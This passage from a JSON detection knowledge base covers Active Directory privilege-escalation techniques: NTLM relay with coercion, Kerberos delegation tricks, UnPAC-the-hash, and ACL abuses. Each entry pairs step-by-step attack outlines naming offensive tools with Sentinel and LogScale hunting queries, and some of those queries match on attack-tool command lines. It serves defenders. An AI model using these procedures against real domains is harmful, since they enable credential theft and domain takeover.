Actor=SubjectUserName, Target=ObjectName, OperationType, Computer\n| where tostring(split(Target,\",\")[0]) !has replace_string(Actor,\"$\",\"\")  // writer != target object\n| order by TimeGenerated asc"},{"plat":"Sentinel","t":"4768 with certificate info (PKINIT) for an account that never uses cert auth = TGT after Shadow Creds (black) / normal smartcard use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where Properties has \"Certificate\"   // PA-PK-AS-REQ / PKINIT pre-auth present\n| summarize tgts=count(), src=make_set(IpAddress,10) by TargetUserName, Computer\n| order by tgts desc"}],"huntcs":[{"plat":"LogScale","t":"Whisker/pywhisker/certipy shadow writing msDS-KeyCredentialLink = Shadow Credentials (black) / WHfB device reg (white)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Whisker|pywhisker|KeyCredentialLink|certipy.*(shadow|auto)|DSInternals.*KeyCredential|ForgeCert)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"msDS-KeyCredentialLink change (5136) then immediate PKINIT TGT (4768) is DC-only, outside Falcon EDR","q":"// Falcon Identity Protection detection: msDS-KeyCredentialLink modification (5136/4662) outside Windows Hello for Business, followed by PKINIT authentication (4768, PA-PK-AS-REQ, certificate info). Endpoint pivot = Whisker/certipy process telemetry above."}]},{"name":"Delegation via NTLM Relay to LDAP (Coerce + Relay RBCD/Shadow)","aka":"PetitPotam relay, DFSCoerce/Coercer + ntlmrelayx delegation","phase":"privesc","group":"Delegation","mitre":"T1557, T1187","cve":"CVE-2021-36942","sev":"Critical","summary":"A compound attack that uses coercion to elicit a machine account's NTLM authentication, relays it to LDAP(S), and writes RBCD attributes or Shadow Credentials to establish a delegation path.","how":"Prereq: LDAP signing/channel binding not enforced at the relay target, a context on the victim computer sufficient for LDAP writes, and a coercible RPC interface. Steps: (1) Listen with ntlmrelayx.py -t ldaps://DC --delegate-access. (2) Coerce the target machine account to authenticate to the relay target via PetitPotam (MS-EFSRPC) / PrinterBug (MS-RPRN) / DFSCoerce (MS-DFSNM) / Coercer. (3) Using the relayed authentication, ntlmrelayx creates a new machine account + sets the target's msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), or sets msDS-KeyCredentialLink with --shadow-credentials. (4) Obtain an impersonation ticket with getST.py/Rubeus and compromise the host. In some cases the DC itself is relayed, leading to DC compromise.","tools":"impacket ntlmrelayx.py (--delegate-access/--shadow-credentials), PetitPotam, printerbug.py, dfscoerce.py, Coercer, addcomputer.py","detect":"Monitor coercion RPC calls (EFSRPC, MS-RPRN spoolss, MS-DFSNM) via named pipe access 5145. Detect anomalous LDAP writes (4662/5136) where a machine account modifies attributes (RBCD/KeyCredentialLink) on objects other than itself. Correlate paths where NTLM authentication reaches LDAP(S), and mismatches between the authenticating source and the operating source IP.","events":"5145 (efsrpc/spoolss/netdfs pipe), 4662, 5136, 4741, 4624 (NTLM Type3)","mitigate":"Enforce LDAP signing + LDAPS channel binding (EPA). Require SMB signing. Disable unneeded EFSRPC/Spooler/DFSNM interfaces and apply patches. Set MachineAccountQuota=0. Enable Extended Protection for Authentication. Audit-alert on RBCD/KeyCredentialLink attribute changes. Restrict unnecessary RPC coercion paths between DCs and to DCs with firewalls.","triage":"Correlate the target host's 5145 for coercion RPC pipes (EFSRPC efsrpc/lsarpc, MS-RPRN spoolss, MS-DFSNM netdfs) with DC 5136/4662 showing a machine account writing msDS-AllowedToActOnBehalfOfOtherIdentity or msDS-KeyCredentialLink on an object other than itself, 4741 (computer created), and 4624 NTLM Type3 landing on LDAP(S). It is malicious when the coercion source IP differs from the IP performing the LDAP write and a getST/Rubeus ticket request (4769) follows immediately. It is benign when the source is backup/monitoring/vuln-scanner doing signed LDAP that only touches its own object; also cross-read MDI Suspected NTLM relay alerts.","hunt":[{"plat":"Sentinel","t":"Machine account LDAP-writing RBCD/KeyCredentialLink onto another object (5136) = coerce+LDAP relay (black) / self-object edits only = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where SubjectUserName endswith \"$\"\n| where Properties has_any (\"msDS-AllowedToActOnBehalfOfOtherIdentity\",\"msDS-KeyCredentialLink\")\n| where tostring(split(ObjectName,\",\")[0]) !has replace_string(SubjectUserName,\"$\",\"\")\n| project TimeGenerated, MachineActor=SubjectUserName, Target=ObjectName, OperationType, Computer\n| order by TimeGenerated asc"},{"plat":"Sentinel","t":"5145 access to efsrpc/spoolss/netdfs pipes preceding LDAP attribute writes = PetitPotam/DFSCoerce chain (black) / one-off legit RPC = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName in~ (\"efsrpc\",\"spoolss\",\"netdfs\",\"lsarpc\",\"fssagentrpc\")\n| summarize hits=count(), pipes=make_set(RelativeTargetName,8) by SubjectUserName, IpAddress, Computer\n| where hits > 2\n| order by hits desc"}],"huntcs":[{"plat":"LogScale","t":"Coercer/PetitPotam + ntlmrelayx --delegate-access = LDAP relay setting RBCD/Shadow (black) / none (white)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(PetitPotam|Coercer|dfscoerce|DFSCoerce|ntlmrelayx|--delegate-access|--escalate-user|efsrpc)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"LogScale","t":"python/relay process on a non-DC host connecting to DC 389/636 = LDAP relay target (black) / admin tool steady LDAP (white)","q":"#event_simpleName=NetworkConnectIP4\n| in(RemotePort, values=[389, 636])\n| ContextBaseFileName=/(python|python3|ntlmrelayx|impacket)/i\n| groupBy([aid, ComputerName, ContextBaseFileName, RemoteAddressIP4, RemotePort], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"S4U2Self Alternate Service Name (sname) Substitution","aka":"Kerberos alternate service class trick, altservice abuse","phase":"privesc","group":"Delegation","mitre":"T1558, T1550.003","cve":"","sev":"High","summary":"A variant that rewrites the service class (sname) portion of a service ticket obtained via S4U delegation to laterally reach a different, non-delegated service (e.g., HOST→LDAP/CIFS).","how":"Prereq: constrained delegation or RBCD already established, allowing an S4U2Proxy ticket for some SPN. Steps: exploits the implementation behavior that although the KDC binds the sname when encrypting/validating the service ticket, the service class portion is not strictly validated by the service for the same host (same account). (1) Obtain an S4U2Proxy ticket for a delegation-allowed SPN (e.g., TIME/host or HTTP/host). (2) Rewrite the ticket's sname with Rubeus /altservice:cifs,host,ldap,http. (3) Use the rewritten ticket to access CIFS (files/PsExec) or LDAP (DCSync). This escalates delegation over a seemingly harmless SPN into full compromise.","tools":"Rubeus s4u /altservice, impacket getST.py -altservice, kekeo","detect":"Correlate mismatches between the service name in 4769 and the service type actually accessed. Detect patterns where a single delegation account accesses multiple service classes (cifs/ldap/host/http) in a short window. Focus monitoring on access to services that shouldn't be in the delegation set (especially ldap = precursor to DCSync).","events":"4769, 4662 (DCSync時のReplication権限アクセス), 4624","mitigate":"Limit constrained delegation target SPNs to only what is truly needed (avoid carelessly including ldap/host/cifs). Avoid protocol transition. Put privileged accounts in Protected Users / mark as not delegatable. Retire RBCD or delegation itself where possible. Pair with DCSync detection (anomalous replication).","triage":"On the DC extract 4769 where one delegation account requests tickets for multiple service classes (cifs/host/ldap/http) in a short window, focusing on SPNs not present in its msDS-AllowedToDelegateTo, especially ldap (a DCSync precursor). It is malicious when the target's 4624 Type3 + 4672, or DC 4662 for replication rights (GUID 1131f6aa/1131f6ad), follows immediately. It is benign when a legitimately configured business app (e.g. web app to SQL/HTTP) accesses only its intended single service class during business hours; confirm Rubeus/kekeo execution on the source via Sysmon EID1/EDR.","hunt":[{"plat":"Sentinel","t":"One delegation account requesting many service classes (cifs/ldap/host/http) in 4769 = sname substitution (black) / single-class normal use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where ServiceName !endswith \"$\" and ServiceName contains \"/\"\n| extend svcClass = tolower(tostring(split(ServiceName,\"/\")[0]))\n| summarize classes=dcount(svcClass), seen=make_set(svcClass,15), tgs=count() by Account, IpAddress\n| where classes >= 3   // ldap present = DCSync前兆に重点\n| order by classes desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus s4u /altservice substituting sname = alternate service-class escalation (ldap = DCSync precursor) (black)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(\\/altservice|s4u.*altservice|Rubeus.*\\/altservice)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"4769 sname vs actual accessed service-class mismatch (esp. ldap) is DC-only, outside Falcon EDR","q":"// Falcon Identity Protection detection: single delegation account requesting multiple service classes (cifs/ldap/host/http) in a short window, especially ldap not in msDS-AllowedToDelegateTo (DCSync precursor). Endpoint pivot = Rubeus /altservice telemetry above."}]},{"name":"Computer Account Takeover via Delegation + U2U getcredentials","aka":"PKINIT UnPAC-the-hash, U2U NTLM extraction","phase":"privesc","group":"Delegation","mitre":"T1550.002","cve":"","sev":"High","summary":"A variant that extracts an account's NTLM hash without a plaintext password, using User-to-User (U2U) + PAC decryption from a TGT obtained via Shadow Credentials or PKINIT.","how":"Prereq: successful PKINIT authentication for the target account (TGT already obtained via Shadow Credentials, etc.). Steps: (1) Use Rubeus asktgt /certificate /getcredentials or gettgtpkinit.py + getnthash.py. (2) Leverage the mechanism where, on PKINIT, the KDC returns PAC_CREDENTIAL_INFO (containing the NTLM hash) encrypted (UnPAC-the-hash), and decrypt it with the TGT session key to obtain the NT hash. (3) Use the hash for Pass-the-Hash/Overpass-the-Hash, DCSync, and persistence. Done against a machine account, it leads directly to full control of that host.","tools":"Rubeus (asktgt /getcredentials), PKINITtools (gettgtpkinit.py, getnthash.py), Certipy (auth), Whisker連携","detect":"Alert when a PKINIT TGT request (4768, PA-PK-AS-REQ, with certificate info) is observed for an account that normally does not use certificate authentication. Correlate the consecutive sequence of Shadow Credentials setup (5136 KeyCredentialLink) and PKINIT authentication. Track subsequent NTLM (PTH) usage.","events":"4768 (証明書/PKINIT), 5136, 4769, 4624 (NTLM Type3)","mitigate":"Build on Shadow Credentials mitigations (minimize/audit msDS-KeyCredentialLink DACLs) and disable PKINIT/Key Trust in environments that don't need them. Use Protected Users to restrict delegation/PKINIT abuse of privileged accounts. Suppress and audit NTLM overall. Periodically inventory KeyCredentialLink.","triage":"On the DC extract 4768 PKINIT TGT requests (PA-PK-AS-REQ/Pre-Auth Type=16, Certificate Information present) from accounts that normally never use certificate auth, especially machine accounts, and flag when preceded by a 5136 msDS-KeyCredentialLink write. It is malicious when UnPAC-the-hash NT-hash recovery is followed by Pass-the-Hash (4624 Type3 NTLM, 4776) or DCSync (4662 GUID 1131f6aa) under the same account; confirm Rubeus/gettgtpkinit.py/getnthash.py execution on the source via Sysmon EID1/EDR. It is benign on hosts where certificate auth is legitimately used (WHfB/smartcard) by the owner during business hours with no subsequent abuse.","hunt":[{"plat":"Sentinel","t":"Machine account obtaining TGT via cert-based 4768 (PKINIT) = account takeover via Shadow Creds (black) / normal host cert auth = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where Properties has \"Certificate\"\n| where TargetUserName endswith \"$\"\n| project TimeGenerated, TargetComputer=TargetUserName, Computer, IpAddress\n| order by TimeGenerated asc"},{"plat":"Sentinel","t":"NTLM network logon by the same account right after PKINIT TGT = PTH via UnPAC-the-hash (black) / standalone cert logon = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| summarize ntlmLogons=count(), hosts=make_set(Computer,15), src=make_set(IpAddress,10) by TargetUserName, bin(TimeGenerated,15m)\n| where ntlmLogons > 3\n| order by ntlmLogons desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus asktgt /getcredentials or gettgtpkinit+getnthash = NTLM extraction from PKINIT (UnPAC-the-hash) (black)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(\\/getcredentials|getcredentials|unpac|gettgtpkinit|getnthash|certipy.*auth|Rubeus.*asktgt.*\\/(certificate|getcredentials))/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"PKINIT TGT (4768) for a non-cert account plus Shadow-Creds sequence is DC-only, outside Falcon EDR","q":"// Falcon Identity Protection detection: PKINIT authentication (4768, PA-PK-AS-REQ) for an account that normally never uses certificates, correlated with prior KeyCredentialLink write (5136) and subsequent NTLM (PTH) usage. Endpoint pivot = Rubeus/certipy telemetry above."}]},{"name":"GenericAll (Full Control)","aka":"Full Control ACE / RIGHT_DS_CONTROL_ACCESS + full rights","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"Critical","summary":"Full control over the target object. The strongest pivot edge across users/groups/computers/OUs.","how":"Branches into arbitrary follow-on attacks depending on the object GenericAll is held over. For a user: ForceChangePassword / Shadow Credentials / Targeted Kerberoast; for a computer: RBCD / Shadow Credentials; for a group: AddMember; for the domain object: WriteDacl to grant DCSync rights. Shown as a GenericAll edge in BloodHound; verify and abuse with `Get-ObjectAcl` / `dacledit.py`.","tools":"PowerView (Add-DomainGroupMember, Set-DomainUserPassword), BloodHound, impacket (dacledit.py, ntlmrelayx), Rubeus, Whisker/pyWhisker","detect":"Monitor privilege exercise with GUIDs via Security 4662 (An operation was performed on an object). Correlate ACL changes (4670), group changes (4728/4732/4756), and forced password change (4724). Detect broad BloodHound-style GenericAll grants themselves via periodic inventory.","events":"4662, 4670, 4724, 4728/4732/4756, 5136","mitigate":"Remove unnecessary GenericAll ACEs and apply least privilege. Audit ACEs on Tier0 objects and enable 4662 via SACL. For protected accounts under AdminSDHolder, break inheritance and reset the ACL.","triage":"On the DC extract 4662 property-access (WRITE/GUID) on the target object and correlate the follow-on action: 4724 forced password reset, 4728/4732/4756 group add, 5136 SPN/KeyCredentialLink change, 4670 DACL change. It is malicious when the actor is an ordinary account that does not normally manage the target and rights-use, abuse and cleanup chain in a short window. It is benign when helpdesk/IAM/AD-ops perform routine provisioning in business hours matching a change ticket; periodically inventory over-broad GenericAll grants with BloodHound.","hunt":[{"plat":"Sentinel","t":"Same actor forcing a password reset (4724) and adding to a privileged group (4728/4732/4756) within an hour = GenericAll abuse (black) / lone helpdesk action = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4724, 4728, 4732, 4756)\n| summarize evs=make_set(EventID,6), targets=make_set(TargetUserName,15), acts=make_set(Activity,6) by SubjectUserName, bin(TimeGenerated,1h)\n| where array_length(evs) >= 2 and set_has_element(evs, 4724)\n| order by SubjectUserName asc"},{"plat":"Sentinel","t":"Non-admin principal exercising broad write/control access in 4662 = granted GenericAll being used (black) / routine system/DC access = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where AccessMask has_any (\"0x40000\",\"0x20000\",\"0xf01ff\")  // WRITE_DAC / WRITE_OWNER / full control\n| where Account !endswith \"$\"\n| summarize ops=count(), objs=make_set(ObjectName,15) by Account, Computer\n| where ops > 0\n| order by ops desc"}],"huntcs":[{"plat":"LogScale","t":"PowerView ACL grant / forced PW reset / group add = GenericAll exercise (black) / legit admin op (white, verify host)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Add-DomainObjectAcl|Set-DomainUserPassword|Add-DomainGroupMember|Set-ADAccountPassword|net\\s+group.*\\/add|net\\s+localgroup.*\\/add|dsacls.*\\/G)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"4662 right-exercise / 4724 forced reset / 4728-4756 group change correlation is DC-only, outside Falcon EDR","q":"// Falcon Identity Protection detection: broad GenericAll ACE grants and their exercise (4662 with property GUID, 4724 password reset, 4728/4732/4756 group add) — periodic ACL inventory. Endpoint pivot = PowerView/net process telemetry above."}]},{"name":"GenericWrite","aka":"Generic Write ACE / RIGHT_DS_WRITE_PROP (all properties)","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098, T1558.003","cve":"","sev":"Critical","summary":"Write access to (nearly) all attributes of the target. Leads to takeover by rewriting SPN / msDS-KeyCredentialLink / scriptPath, etc.","how":"For a user target: write servicePrincipalName for Targeted Kerberoasting, write msDS-KeyCredentialLink for Shadow Credentials, or rewrite scriptPath/logon script for code execution. For a computer target: write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD. A group's member is usually included in GenericWrite, enabling AddMember.","tools":"PowerView (Set-DomainObject), Rubeus, Whisker/pyWhisker, targetedKerberoast.py, impacket (rbcd.py, addspn.py)","detect":"Monitor writes to target GUIDs (msDS-KeyCredentialLink=5b47d60f..., servicePrincipalName, etc.) via 4662. Capture changes to SPN or msDS-KeyCredentialLink attributes via 5136 (directory object change). Correlate anomalous SPN additions with subsequent Kerberos 4769.","events":"4662, 5136, 4769, 4738","mitigate":"Inventory and remove GenericWrite ACEs. Enable SACL auditing of msDS-KeyCredentialLink changes to detect Shadow Credentials. Restrict SPN additions; put sensitive accounts in protected groups and break inheritance via AdminSDHolder.","triage":"On the DC correlate 4662 writes to target GUIDs (servicePrincipalName, msDS-KeyCredentialLink=5b47d60f-6090-40b2-9f37-2a4de88f3063) with 5136 actual changes to SPN/KeyCredentialLink/scriptPath. It is malicious when an anomalous SPN add is followed by 4769 (Targeted Kerberoast, Ticket Encryption 0x17=RC4), or a KeyCredentialLink add is followed by PKINIT, under the same account; confirm PowerView/targetedKerberoast.py/Whisker on the source via Sysmon EID1/EDR. It is benign when an ops account legitimately sets SPNs/attributes for app registration, SCCM or service configuration during business hours.","hunt":[{"plat":"Sentinel","t":"5136 value-add write to servicePrincipalName or msDS-KeyCredentialLink = GenericWrite abuse (black) / no attribute change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"servicePrincipalName\" or Properties has \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\"   // Value Added\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, Computer\n| order by TimeGenerated asc"},{"plat":"Sentinel","t":"Many RC4 (0x17) service tickets to a just-SPN'd account = targeted Kerberoast (black) / normal AES service use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769 and TicketEncryptionType == \"0x17\"\n| summarize tgs=count(), svcs=make_set(ServiceName,15) by Account, IpAddress\n| where tgs > 3\n| order by tgs desc"}],"huntcs":[{"plat":"LogScale","t":"servicePrincipalName write or KeyCredentialLink write = GenericWrite abuse (targeted Kerberoast/Shadow) (black)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Set-DomainObject.*servicePrincipalName|servicePrincipalName|Set-ADUser.*ServicePrincipalNames|setspn\\s+-a|targetedKerberoast|Set-DomainObject.*msDS-KeyCredentialLink)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"SPN add (5136) then immediate 4769 (targeted Kerberoast) correlation is DC-only, outside Falcon EDR","q":"// Falcon Identity Protection detection: servicePrincipalName or msDS-KeyCredentialLink write (5136/4662) on a user object followed by a Kerberos service-ticket request (4769) — targeted Kerberoasting. Endpoint pivot = SPN/write process telemetry above."}]},{"name":"WriteDACL","aka":"WriteDacl / WRITE_DAC","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"Critical","summary":"Rights to rewrite the target's DACL. Escalate to other attacks by granting yourself arbitrary ACEs (e.g., GenericAll).","how":"With WriteDacl, append a GenericAll ACE for yourself or replication-rights ACEs for DCSync to the target object's DACL. Done against the domain root, grant DS-Replication-Get-Changes/-All to enable DCSync. Operate with `dacledit.py` or PowerView `Add-DomainObjectAcl`.","tools":"PowerView (Add-DomainObjectAcl), impacket dacledit.py, BloodHound, ntlmrelayx.py (-–escalate-user)","detect":"Monitor nTSecurityDescriptor attribute changes via 5136, especially DACL additions to domain objects or AdminSDHolder. Confirm write access via 4662. Correlate subsequent DCSync using the granted replication rights (4662 GUID 1131f6aa/1131f6ad).","events":"5136, 4662, 4670","mitigate":"Remove WriteDacl ACEs and periodically inventory owners/ACLs. Enable SACL auditing on the domain object/AdminSDHolder. Set alerts on ACL changes to critical objects.","triage":"On the DC extract 5136 nTSecurityDescriptor changes, especially on the domain root/AdminSDHolder/Tier0 objects, and confirm WRITE_DAC access via 4662. It is malicious when the added ACE grants self GenericAll or replication rights (DS-Replication-Get-Changes GUID 1131f6aa / -All 1131f6ad) and DCSync (4662 with those GUIDs) follows from that account; confirm dacledit.py/PowerView Add-DomainObjectAcl on the source via EDR. It is benign when AD-ops make a delegation/GPO design change per change control during business hours.","hunt":[{"plat":"Sentinel","t":"5136 change to nTSecurityDescriptor on domain root/AdminSDHolder = WriteDACL abuse (black) / planned admin delegation change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"nTSecurityDescriptor\"\n| where ObjectName has_any (\"AdminSDHolder\",\"CN=System\") or ObjectName startswith \"DC=\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, OperationType, Computer\n| order by TimeGenerated asc"},{"plat":"Sentinel","t":"Follow-on DCSync via replication rights gained from WriteDACL (4662 GUID 1131f6aa/1131f6ad) = privesc completed (black) / DC-to-DC replication = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" or Properties has \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\"\n| where Account !endswith \"$\"\n| project TimeGenerated, Account, Computer, ObjectName\n| order by TimeGenerated asc"}],"huntcs":[{"plat":"LogScale","t":"Add-DomainObjectAcl -Rights DCSync/WriteDacl or AdminSDHolder tamper = WriteDACL abuse (black) / none (white)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Add-DomainObjectAcl|-Rights\\s+(DCSync|WriteDacl|All)|WriteDacl|AdminSDHolder|nTSecurityDescriptor|dsacls.*\\/G.*(WP|WD)|DS-Replication-Get-Changes)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"nTSecurityDescriptor change (5136) granting replication rights then DCSync (4662 GUID 1131f6aa/ad) is DC-only","q":"// Falcon Identity Protection detection: nTSecurityDescriptor/DACL modification (5136/4662) on the domain object or AdminSDHolder, then DCSync via granted replication rights (4662 GUID 1131f6aa-9c07/1131f6ad-9c07). Endpoint pivot = Add-DomainObjectAcl process telemetry above."}]},{"name":"WriteOwner","aka":"Owns / WriteOwner / WRITE_OWNER","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"High","summary":"Change the target's owner to yourself. Since the owner can implicitly rewrite the DACL, this escalates to the equivalent of WriteDacl.","how":"With WriteOwner, change the target object's owner to yourself (or a controlled account), then use owner rights to perform WriteDacl and grant yourself GenericAll. From there, branch into all GenericAll-family attacks. Operate in the order `owneredit.py` → `dacledit.py`.","tools":"PowerView (Set-DomainObjectOwner), impacket owneredit.py/dacledit.py, BloodHound (Owns/WriteOwnerエッジ)","detect":"Monitor nTSecurityDescriptor (owner) changes via 5136 and detect WRITE_OWNER access via 4662. Detect the anomaly of an owner changing from the default (Domain Admins/Enterprise Admins) to an individual account.","events":"5136, 4662","mitigate":"Standardize ownership of critical objects to administrative groups and audit. Remove WriteOwner ACEs. Alert on owner changes in the SIEM, and periodically remediate protected-account ACLs via AdminSDHolder.","triage":"On the DC extract 5136 owner changes in nTSecurityDescriptor and confirm WRITE_OWNER access via 4662. It is malicious when ownership moves from a default (Domain Admins/Enterprise Admins/CREATOR OWNER) to an individual/low-priv account and that account then chains WriteDacl to self-GenericAll (a further 5136 DACL add); confirm the owneredit.py then dacledit.py sequence on the source via EDR. It is benign when AD-ops perform an object hand-off/delegation redesign per change control and ownership stays within an admin group.","hunt":[{"plat":"Sentinel","t":"5136 owner (SDDL O:) change on nTSecurityDescriptor by a user account = suspect / routine admin change = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"nTSecurityDescriptor\"\n| where Properties has \"O:\"   // SDDL owner field present in the modified descriptor\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, ObjectType, OperationType, Properties\n| order by TimeGenerated desc"},{"plat":"Sentinel","t":"4662 WRITE_OWNER (AccessMask 0x80000) exercised across many objects by one principal = suspect / single admin op = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where AccessMask has \"0x80000\"   // WRITE_OWNER\n| where SubjectUserName !endswith \"$\"\n| summarize objects=dcount(ObjectName), sample=make_set(ObjectName,20) by SubjectUserName, Computer, bin(TimeGenerated,1h)\n| where objects > 1"}],"huntcs":[{"plat":"Event Search","t":"WriteOwner tooling (Set-DomainObjectOwner/dsacls) on an endpoint = suspicious; routine AD admin = benign","q":"event_simpleName=ProcessRollup2\n| search CommandLine=\"*Set-DomainObjectOwner*\" OR CommandLine=\"*Set-ADObject*Owner*\" OR CommandLine=\"*dsacls*/takeownership*\" OR CommandLine=\"*SetOwner*\" OR CommandLine=\"*nTSecurityDescriptor*Owner*\"\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName, ParentBaseFileName\n| where ParentBaseFileName!=\"mmc.exe\"\n| sort - count"}]},{"name":"AddMember (Group Membership Write)","aka":"GenericWrite on group / WriteProperty(member) / group tampering","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1078.002","cve":"","sev":"Critical","summary":"Write a group's member attribute to add an arbitrary account to a privileged group (e.g., Domain Admins).","how":"Add a controlled account to a group where you hold GenericAll/GenericWrite/WriteProperty(member) to inherit its privileges. A Tier0 group like Domain Admins means immediate domain takeover. Add with `Add-DomainGroupMember`, net/PowerShell, or `net rpc group addmem`, sometimes removing afterward to erase traces.","tools":"PowerView (Add-DomainGroupMember), net.exe, Active Directory PowerShellモジュール, BloodHound (AddMemberエッジ)","detect":"Monitor member-add events on privileged groups (4728 global / 4732 local / 4756 universal). Capture member attribute changes via 5136. Alert on add-then-remove patterns in a short window and unexpected additions to Tier0 groups.","events":"4728, 4732, 4756, 5136","mitigate":"Minimize privileged-group ACLs and restrict member write access. Real-time notify on protected-group changes. Operate privileged groups that can be emptied via JIT/PIM and eliminate standing members.","triage":"On the DC monitor 4728 (global)/4732 (domain local)/4756 (universal) for privileged groups (Tier0 such as Domain Admins) and correlate with 5136 member changes. It is malicious when the actor does not normally manage the group and there is an add-abuse-remove pattern (4729/4733/4757) or an add outside business hours/change control; confirm PowerView/net rpc group addmem on the source via Sysmon EID1/EDR. It is benign when IAM/helpdesk add and retain the member per an approved workflow.","hunt":[{"plat":"Sentinel","t":"4728/4732/4756 unexpected member add into a Tier0 group = suspect / approved admin onboarding = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4728,4732,4756)\n| where TargetUserName in~ (\"Domain Admins\",\"Enterprise Admins\",\"Administrators\",\"Schema Admins\",\"Account Operators\",\"Backup Operators\")\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, EventID, Actor=SubjectUserName, AddedMember=MemberName, Group=TargetUserName"},{"plat":"Sentinel","t":"Same member added to multiple privileged groups within a short window (4728/4732/4756) = privilege stacking (suspect) / single-group add = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4728,4732,4756)\n| where TargetUserName in~ (\"Domain Admins\",\"Enterprise Admins\",\"Administrators\",\"Schema Admins\",\"Account Operators\",\"Backup Operators\")\n| summarize groups=dcount(TargetUserName), grpset=make_set(TargetUserName,10), span=max(TimeGenerated)-min(TimeGenerated) by MemberName, SubjectUserName\n| where groups > 1 and span < 1h"}],"huntcs":[{"plat":"LogScale","t":"Privileged-group member add from a workstation/non-admin context = suspicious; scheduled ops from DC/PAW = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(net(1)?\\s+(local)?group|Add-ADGroupMember|Add-DomainGroupMember).*(Domain Admins|Enterprise Admins|Administrators|Schema Admins|Backup Operators|DnsAdmins)/i\n| CommandLine=/\\/add|-Members|-Identity/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"},{"plat":"Event Search","t":"Same host doing both group add and remove in a short window = suspicious flip; steady one-way ops = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*group*/add*\" OR CommandLine=\"*group*/delete*\" OR CommandLine=\"*Add-ADGroupMember*\" OR CommandLine=\"*Remove-ADGroupMember*\")\n| eval act=if(like(CommandLine,\"%/add%\") OR like(CommandLine,\"%Add-ADGroupMember%\"),\"add\",\"del\")\n| stats dc(act) as verbs values(CommandLine) as cmds by ComputerName, UserName\n| where verbs>1"}]},{"name":"ForceChangePassword","aka":"User-Force-Change-Password extended right","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1531","cve":"","sev":"High","summary":"An extended right to set a new password for a target user without knowing the current one. Account takeover.","how":"Force-set a new password on a user for which you hold the User-Force-Change-Password extended right (or GenericAll), then log on. Use `Set-DomainUserPassword`, impacket `changepasswd.py`, or `net rpc password`. Note that if the target is actively in use, the business impact makes it more likely to be noticed.","tools":"PowerView (Set-DomainUserPassword), impacket (net.py, changepasswd.py, smbpasswd), Rubeus (後続)","detect":"Monitor 4724 (password reset attempts) for cases where the actor and target are not in a normal administrative relationship. Correlate 4738 (account change) and 